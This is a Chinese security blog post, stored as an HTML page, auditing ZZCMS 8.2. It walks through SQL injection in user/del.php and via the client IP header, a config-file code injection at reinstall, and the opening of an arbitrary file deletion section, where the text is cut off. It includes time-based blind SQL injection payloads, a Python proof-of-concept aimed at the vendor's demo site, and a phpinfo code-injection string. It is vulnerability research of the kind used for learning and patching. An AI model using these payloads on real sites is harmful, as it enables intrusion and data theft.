@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>ZZCMS8.2 sql注入+任意文件删除+配置文件写入问题=GetShell | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前端SQL注入"><span class="toc-text">前端SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tablename注入点"><span class="toc-text">tablename注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题文件-user-del-php"><span class="toc-text">问题文件:user/del.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ip注入点"><span class="toc-text">ip注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#问题文件-user-logincheck-php"><span class="toc-text">问题文件 /user/logincheck.php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#配置文件写入问题"><span class="toc-text">配置文件写入问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#install-step4-php-仅对传入的当前网站访问地址做是否为空判断"><span class="toc-text">install/step4.php 仅对传入的当前网站访问地址做是否为空判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#install-index-php-保存配置文件-未对传入数据进行清洗"><span class="toc-text">install/index.php 保存配置文件.未对传入数据进行清洗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意文件删除"><span class="toc-text">任意文件删除</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#情况一：在action-add的情况下进行任意文件删除"><span class="toc-text">情况一：在action=add的情况下进行任意文件删除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#情况二：在action-modify的情况下进行任意文件删除"><span class="toc-text">情况二：在action=modify的情况下进行任意文件删除</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">ZZCMS8.2 sql注入+任意文件删除+配置文件写入问题=GetShell</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 27, 2018&nbsp;&nbsp;11:59:19</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <p>还是太菜了,搭好的CMS注册用户时显示不出验证码,以至于无法注册,只复现出配置文件写入的问题.</p>
+<p>就以此篇慢慢入手代码审计吧.</p>
+<a id="more"></a>
+<h2 id="前端SQL注入"><a href="#前端SQL注入" class="headerlink" title="前端SQL注入"></a>前端SQL注入</h2><p>个人理解:分析是否存在注入,先从输入点找起,再寻找是否有对数据清洗的函数,再判断数据流向</p>
+<h3 id="tablename注入点"><a href="#tablename注入点" class="headerlink" title="tablename注入点"></a>tablename注入点</h3><h4 id="问题文件-user-del-php"><a href="#问题文件-user-del-php" class="headerlink" title="问题文件:user/del.php"></a>问题文件:user/del.php</h4><p>从此处用post方法接受pagename,tablename,id三个参数.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$pagename=trim($_POST[<span class="string">"pagename"</span>]);</span><br><span class="line">$tablename=trim($_POST[<span class="string">"tablename"</span>]);</span><br><span class="line">$id=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($_POST[<span class="string">'id'</span>]);$i++)&#123;</span><br><span class="line">   checkid($_POST[<span class="string">'id'</span>][$i]);</span><br><span class="line">    $id=$id.($_POST[<span class="string">'id'</span>][$i].<span class="string">','</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   $id=substr($id,<span class="number">0</span>,strlen($id)<span class="number">-1</span>);<span class="comment">//去除最后面的","</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现有个checkid()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkid</span><span class="params">($id,$classid=<span class="number">0</span>,$msg=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($id&lt;&gt;<span class="string">''</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span> (is_numeric($id)==<span class="keyword">false</span>)&#123;showmsg(<span class="string">'参数 '</span>.$id.<span class="string">' 有误！相关信息不存在'</span>);&#125;</span><br><span class="line">   <span class="keyword">elseif</span> ($id&gt;<span class="number">100000000</span>)&#123;showmsg(<span class="string">'参数超出了数字表示范围！系统不与处理。'</span>);&#125;<span class="comment">//因为clng最大长度为9位</span></span><br><span class="line">   <span class="keyword">if</span> ($classid==<span class="number">0</span>)&#123;<span class="comment">//查大小类ID时这里设为1</span></span><br><span class="line">      <span class="keyword">if</span> ($id&lt;<span class="number">1</span>)&#123;showmsg(<span class="string">'参数有误！相关信息不存在。\r\r提示：'</span>.$msg);&#125;<span class="comment">//翻页中有用,这个提示msg在其它地方有用</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>id只能为数字,并且限制了数字的范围.因此id难以利用</p>
+<p>那继续看看pagename,tablename</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">代码<span class="number">27</span>行开始,判断tablename的情况,</span><br><span class="line"><span class="keyword">switch</span> ($tablename)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"zzcms_main"</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      $sql=<span class="string">"select img,flv,editor from zzcms_main where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $sql=<span class="string">"select img,flv,editor from zzcms_main where id ='$id'"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=num_rows($rs);</span><br><span class="line">代码<span class="number">92</span>行有传入tablename进行数据库操作</span><br><span class="line"><span class="keyword">if</span> ($tablename==<span class="string">'zzcms_guestbook'</span>)&#123;<span class="comment">//saver</span></span><br><span class="line"><span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>)&#123;    </span><br><span class="line">   $sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   $sql=<span class="string">"select id,saver from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=num_rows($rs);</span><br><span class="line"><span class="keyword">if</span> ($row)&#123;</span><br><span class="line"><span class="keyword">while</span> ($row=fetch_array($rs))&#123; </span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="string">"saver"</span>]&lt;&gt;$username)&#123;</span><br><span class="line">   markit();</span><br><span class="line"></span><br><span class="line">   showmsg(<span class="string">'非法操作！警告：你的操作已被记录！小心封你的用户及IP！'</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   query(<span class="string">"delete from "</span>.$tablename.<span class="string">" where id ="</span>.$row[<span class="string">'id'</span>].<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='"</span>.$pagename.<span class="string">"';&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是表名被固定zzcms_guestbook,继续往下看<br>代码135行,最后一个else 发现传入的tablename可控,且并没有对数据清洗,因此这里存在sql注入.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>)&#123;    </span><br><span class="line">   $sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id in ("</span>. $id .<span class="string">")"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   $sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=num_rows($rs);</span><br></pre></td></tr></table></figure>
+
+<p>其实该CMS有对sql作出防御因为注入的位置是表名，因此可以不需要引入符号进行闭合，所以就可以无视/inc/stopsqlin.php文件中的安全处理规则，所以此处可以直接进行SQL注入。<br>Payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;tablename=zzcms_answer where id=999999999 union select 1,2 and if((ascii(substr(user(),1,1)) = 114),sleep(3),1)#</span><br></pre></td></tr></table></figure>
+
+<p>由于环境问题,没法复现,图片是偷的<br>Stopsqlin.php的过滤函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zc_check</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!is_array($string))&#123;</span><br><span class="line">      <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">      <span class="keyword">return</span> htmlspecialchars(trim($string));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> addslashes(htmlspecialchars(trim($string)));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">foreach</span>($string <span class="keyword">as</span> $k =&gt; $v) $string[$k] = zc_check($v);</span><br><span class="line">   <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123;</span><br><span class="line">   $_POST =zc_check($_POST);</span><br><span class="line">   $_GET =zc_check($_GET);</span><br><span class="line">   $_COOKIE =zc_check($_COOKIE);</span><br><span class="line">   @extract($_POST);</span><br><span class="line">   @extract($_GET);   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//特别的表单，需要特别提示的</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="zzcms8-2/SQL11.png" alt></p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>    <span class="comment">#匹配用的字符串</span></span><br><span class="line">url = <span class="string">"http://demo.zzcms.net/user/del.php"</span></span><br><span class="line">user = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:    <span class="comment">#遍历取出字符</span></span><br><span class="line">                startTime = time.time()</span><br><span class="line">                post_data = <span class="string">"id=1&amp;tablename=zzcms_answer where id = 1 and if((ascii(substr(user(),1,1))="</span> + str(ord(payload)) + <span class="string">"),sleep(5),1)%23"</span>.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                response = requests.post(url, timeout=<span class="number">6</span>, data=post_data, headers=&#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;  )</span><br><span class="line"><span class="keyword">if</span> time.time() - startTime &gt; <span class="number">5</span>:</span><br><span class="line">                        user = payload</span><br><span class="line"><span class="keyword">print</span> <span class="string">'user is:'</span>, user</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n[Done] current user is %s'</span> % user</span><br></pre></td></tr></table></figure>
+
+<h3 id="ip注入点"><a href="#ip注入点" class="headerlink" title="ip注入点"></a>ip注入点</h3><h4 id="问题文件-user-logincheck-php"><a href="#问题文件-user-logincheck-php" class="headerlink" title="问题文件 /user/logincheck.php"></a>问题文件 /user/logincheck.php</h4><p>ip利用自定义的getip()函数获取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'../3/ucenter_api/config.inc.php'</span>;<span class="comment">//集成ucenter</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../3/ucenter_api/uc_client/client.php'</span>;<span class="comment">//集成ucenter</span></span><br><span class="line">$ip=getip();</span><br><span class="line">define(<span class="string">'trytimes'</span>,<span class="number">5</span>);<span class="comment">//可尝试登录次数</span></span><br><span class="line">define(<span class="string">'jgsj'</span>,<span class="number">10</span>*<span class="number">60</span>);<span class="comment">//间隔时间，秒</span></span><br><span class="line">$sql=<span class="string">"select * from zzcms_login_times where ip='$ip' and count&gt;="</span>.trytimes.<span class="string">" and unix_timestamp()-unix_timestamp(sendtime)&lt;"</span>.jgsj.<span class="string">" "</span>;</span><br><span class="line">$rs = query($sql); </span><br><span class="line">$row= num_rows($rs);</span><br><span class="line"><span class="keyword">if</span> ($row)&#123;</span><br><span class="line">$jgsj=jgsj/<span class="number">60</span>;</span><br><span class="line">showmsg(<span class="string">"密码错误次数过多，请于"</span>.$jgsj.<span class="string">"分钟后再试！"</span>);</span><br><span class="line">&#125;</span><br><span class="line">checkyzm($_POST[<span class="string">"yzm"</span>]);</span><br><span class="line">$go=<span class="number">0</span>;</span><br><span class="line">$username=nostr(trim($_POST[<span class="string">"username"</span>]));</span><br><span class="line">$password=md5(trim($_POST[<span class="string">"password"</span>]));</span><br><span class="line">$fromurl=@$_POST[<span class="string">"fromurl"</span>];</span><br><span class="line">$CookieDate=@$_POST[<span class="string">"CookieDate"</span>][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> ($CookieDate==<span class="string">""</span>) &#123;</span><br><span class="line">$CookieDate=<span class="number">0</span>;</span><br><span class="line">&#125;_</span><br></pre></td></tr></table></figure>
+
+<p>跟进getip()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"HTTP_CLIENT_IP"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_CLIENT_IP"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"REMOTE_ADDR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"REMOTE_ADDR"</span>), <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = getenv(<span class="string">"REMOTE_ADDR"</span>); </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"unknown"</span>)) </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>]; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">$ip = <span class="string">"unknown"</span>; </span><br><span class="line"><span class="keyword">return</span>($ip); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有对ip进行数据清洗,因此此处存在注入,可利用时间盲注获取数据</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1’ and if(length(database())&gt;1,sleep(4),0) %23</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置文件写入问题"><a href="#配置文件写入问题" class="headerlink" title="配置文件写入问题"></a>配置文件写入问题</h2><h3 id="install-step4-php-仅对传入的当前网站访问地址做是否为空判断"><a href="#install-step4-php-仅对传入的当前网站访问地址做是否为空判断" class="headerlink" title="install/step4.php 仅对传入的当前网站访问地址做是否为空判断"></a>install/step4.php 仅对传入的当前网站访问地址做是否为空判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (document.myform.db_host.value==<span class="string">''</span>)&#123;</span><br><span class="line">   alert(<span class="string">'请填写数据库服务器'</span>);</span><br><span class="line">   document.myform.db_host.focus();</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (document.myform.db_user.value==<span class="string">''</span>)&#123;</span><br><span class="line">   alert(<span class="string">'请填写数据库用户名'</span>);</span><br><span class="line">   document.myform.db_user.focus();</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (document.myform.db_name.value==<span class="string">''</span>)&#123;</span><br><span class="line">   alert(<span class="string">'请填写数据库名'</span>);</span><br><span class="line">   document.myform.db_name.focus();</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(document.myform.db_name.value.search(re)==<span class="number">-1</span>)  </span><br><span class="line">&#123;</span><br><span class="line">   alert(<span class="string">"数据库名只能用字母或数字！"</span>);</span><br><span class="line">document.myform.db_name.focus();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span> (document.myform.url.value==<span class="string">''</span>)&#123;</span><br><span class="line">   alert(<span class="string">'请填写当前网站访问地址'</span>);</span><br><span class="line">   document.myform.url.focus();</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (document.myform.admin.value==<span class="string">''</span>)&#123;</span><br><span class="line">   alert(<span class="string">'请填写管理员帐号'</span>);</span><br><span class="line">   document.myform.admin.focus();</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (document.myform.adminpwd.value==<span class="string">''</span>)&#123;</span><br><span class="line">   alert(<span class="string">'请填写管理员帐号'</span>);</span><br><span class="line">   document.myform.adminpwd.focus();</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (document.myform.adminpwd.value!=document.myform.adminpwd2.value)&#123;</span><br><span class="line">alert (<span class="string">"两次密码输入不一致，请重新输入。"</span>);</span><br><span class="line">document.myform.adminpwd.value=<span class="string">''</span>;</span><br><span class="line">document.myform.adminpwd2.value=<span class="string">''</span>;</span><br><span class="line">document.myform.adminpwd.focus();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="install-index-php-保存配置文件-未对传入数据进行清洗"><a href="#install-index-php-保存配置文件-未对传入数据进行清洗" class="headerlink" title="install/index.php 保存配置文件.未对传入数据进行清洗"></a>install/index.php 保存配置文件.未对传入数据进行清洗</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//保存配置文件</span></span><br><span class="line">$fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">$f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">$str = fread($f,filesize($fp));</span><br><span class="line">fclose($f);</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlhost','"</span>.sqlhost.<span class="string">"')"</span>,<span class="string">"define('sqlhost','$db_host')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlport','"</span>.sqlport.<span class="string">"')"</span>,<span class="string">"define('sqlport','$db_port')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqldb','"</span>.sqldb.<span class="string">"')"</span>,<span class="string">"define('sqldb','$db_name')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqluser','"</span>.sqluser.<span class="string">"')"</span>,<span class="string">"define('sqluser','$db_user')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlpwd','"</span>.sqlpwd.<span class="string">"')"</span>,<span class="string">"define('sqlpwd','$db_pass')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br><span class="line">$f=fopen($fp,<span class="string">"w+"</span>);<span class="comment">//fopen()的其它开关请参看相关函数</span></span><br></pre></td></tr></table></figure>
+
+<p>于是在构造payload填入当前网站访问地址<br> localhost’);phpinfo();#<br>语句闭合为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','localhost’);phpinfo();#')"</span>,$str) ;</span><br></pre></td></tr></table></figure>
+
+<p>达到代码注入的目的,从而getshell.但是这个漏洞需要配合任意文件删除,删除install/install.lock文件,进行重装,否则这个漏洞无法利用<br>这个漏洞复现成功了.(可能真的是我丑,只复现出一个)<br><img src="zzcms8-2/ZZCMS_CVE1.png" alt></p>
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>这个点由于没有复现成功不是很理解,记录姿势以后再看看吧.</p>
+<h4 id="情况一：在action-add的情况下进行任意文件删除"><a href="#情况一：在action-add的情况下进行任意文件删除" class="headerlink" title="情况一：在action=add的情况下进行任意文件删除"></a>情况一：在action=add的情况下进行任意文件删除</h4><p> 首先进行如下请求在img参数位置填入要删除的文件路径，如根目录下的1.txt。</p>
